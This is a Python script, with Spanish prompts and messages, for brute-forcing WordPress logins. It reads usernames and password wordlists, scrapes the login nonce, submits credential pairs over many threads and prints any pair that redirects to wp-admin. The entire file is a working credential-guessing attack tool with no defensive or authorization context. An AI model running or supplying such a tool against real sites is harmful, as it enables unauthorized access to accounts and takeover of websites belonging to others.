from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import time
import signal
import sys
import os
from tqdm import tqdm
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Style.BRIGHT}{Fore.CYAN}
■▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀■
■ {Fore.WHITE}WORDPRESS BRUTE FORCE {Fore.CYAN}■
■▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄■
{Style.RESET_ALL}"""

def cargar_wordlist(ruta):
    encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
    for encoding in encodings:
        try:
            with open(ruta, 'r', encoding=encoding, errors='strict') as f:
                lineas = [linea.strip() for linea in f if linea.strip()]
                print(f"{Fore.GREEN}✅ Encoding detectado: {encoding}{Style.RESET_ALL}")
                return lineas
        except UnicodeDecodeError:
            continue
    
    try:
        with open(ruta, 'r', encoding='latin-1', errors='replace') as f:
            lineas = [linea.strip() for linea in f if linea.strip()]
            print(f"{Fore.YELLOW}⚠️  Usando encoding latín-1 con reemplazo{Style.RESET_ALL}")
            return lineas
    except Exception as e:
        raise ValueError(f"Error de carga: {str(e)}")

def check_login(login_url, user, password, timeout):
    try:
        with requests.Session() as session:
            response = session.get(login_url, timeout=timeout)
            nonce = response.text.split('name="_wpnonce" value="')[1].split('"')[0] if '_wpnonce"' in response.text else ""
            
            response = session.post(
                login_url,
                data=f"log={user}&pwd={password}&wp-submit=Log+In&testcookie=1&_wpnonce={nonce}",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=timeout,
                allow_redirects=False
            )
            
            return (user, password) if response.status_code == 302 and "wp-admin" in response.headers.get('Location', '') else None
            
    except Exception:
        return None

def brute_force(url):
    print(BANNER)
    
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}URL de login completo (ej: http://sitio.com/wp-login.php): ", end="")
    login_url = input().strip()
    
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}Usuario (archivo/texto): ", end="")
    user_input = input().strip()
    
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}Contraseñas (archivo/texto): ", end="")
    pass_input = input().strip()
    
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}Hilos [20]: ", end="")
    threads = int(input().strip() or "20")
    
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}Timeout (s) [5]: ", end="")
    timeout = int(input().strip() or "5")

    try:
        start_time = time.time()
        users = [user_input] if not os.path.isfile(user_input) else cargar_wordlist(user_input)
        passwords = [pass_input] if not os.path.isfile(pass_input) else cargar_wordlist(pass_input)
        tiempo_carga = time.time() - start_time
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        return

    total_creds = len(users) * len(passwords)
    print(f"\n{Fore.CYAN}[i] Combinaciones totales: {Fore.WHITE}{total_creds:,}")
    print(f"{Fore.CYAN}[i] Tiempo de carga: {Fore.WHITE}{tiempo_carga:.2f}s{Style.RESET_ALL}")

    encontrado = False
    with tqdm(
        total=total_creds,
        desc=f"{Fore.CYAN}⏳ Progreso{Style.RESET_ALL}",
        unit=" creds",
        dynamic_ncols=True,
        bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]",
        leave=False
    ) as pbar:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            try:
                for user in users:
                    for pwd in passwords:
                        if encontrado:
                            break
                        futures.append(executor.submit(check_login, login_url, user, pwd, timeout))
                        
                        if len(futures) >= threads * 2:
                            for future in as_completed(futures):
                                if result := future.result():
                                    encontrado = True
                                    pbar.clear()
                                    print(f"\033[1A\033[2K{Fore.GREEN}✅ {Style.BRIGHT}Credenciales válidas: {Fore.WHITE}{result[0]}:{result[1]}{Style.RESET_ALL}")
                                    executor.shutdown(wait=False)
                                    return
                                pbar.update(1)
                            futures = []
                
                for future in as_completed(futures):
                    if result := future.result():
                        encontrado = True
                        pbar.clear()
                        print(f"\033[1A\033[2K{Fore.GREEN}✅ {Style.BRIGHT}Credenciales válidas: {Fore.WHITE}{result[0]}:{result[1]}{Style.RESET_ALL}")
                        break
                    pbar.update(1)

            except KeyboardInterrupt:
                pbar.clear()
                print(f"\n{Fore.RED}❌ Escaneo interrumpido por el usuario{Style.RESET_ALL}")
                executor.shutdown(wait=False)
                sys.exit(1)

    if not encontrado:
        print(f"\n{Fore.RED}❌ {Style.BRIGHT}No se encontraron credenciales válidas{Style.RESET_ALL}")

def handle_sigint(signum, frame):
    print(f"\n{Fore.RED}[!] Escaneo cancelado{Style.RESET_ALL}")
    sys.exit(1)

signal.signal(signal.SIGINT, handle_sigint)
